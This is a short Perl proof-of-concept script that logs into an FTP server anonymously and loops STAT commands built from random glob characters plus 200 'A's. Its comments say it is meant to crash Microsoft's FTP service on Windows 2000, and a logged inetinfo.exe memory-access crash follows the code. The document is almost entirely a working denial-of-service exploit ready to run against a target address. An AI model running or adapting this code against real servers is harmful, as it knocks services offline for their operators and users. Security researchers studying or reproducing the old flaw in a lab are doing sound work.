#!/usr/bin/perl -w
##################

# cheezy perl to fuzz ftp globs
# this one is designed for msftpd and STAT

use Net::FTP;
srand(time() + int($$));
    
$target = shift() || "127.0.0.1";
my $user = "anonymous";
my $pass = "crash\@burn.com";

$ftp = Net::FTP->new($target, Debug => 0, Port => 21) || die "could not connect: $!";
$ftp->login($user, $pass) || die "could not login: $!";
$ftp->cwd("/pub");




# crash it
while (1)
{
    $g = GetGlob();
    print STDERR "Trying: $g\n";
    $ret = $ftp->quot("STAT $g");
    if ($ret !~ /^2/)
    {
        print "Error: FTP server returned an error response.\n";
        exit(1);
    }
}

$ftp->quit;

sub GetGlob {
    my $result;
    
    $len = 45;
    @globs = split(//, "?.\\*");

    # build a string consisting of random sequencs
    # of the glob character array
    for (1 .. $len)
    {
        $result .= $globs[int(rand() * scalar(@globs))];
    }
    
    # this provides some padding which is required
    # for the daemon to crash. my guess is that an
    # internal file name buffer is being overflowed
    # when a glob result string and a large char string
    # are combined, the length isnt checked.
    $result .= "A" x 200;
    
    return $result;
}

__END__

Only tested on Windows 2000 / MSFTPD 5.0 / Full Patches/SP2:

Event Type:     Information
Event Source:   Application Popup
Event Category: None
Event ID:       26
Date:           12/2/2001
Time:           3:37:27 PM
User:           N/A
Computer:       SHATTERED
Description:
Application popup: inetinfo.exe - Application Error : The instruction at 
"0x6fc6a35c" referenced memory at "0x00000000". The memory could not be 
"written".

Click on OK to terminate the program
Click on CANCEL to debug the program
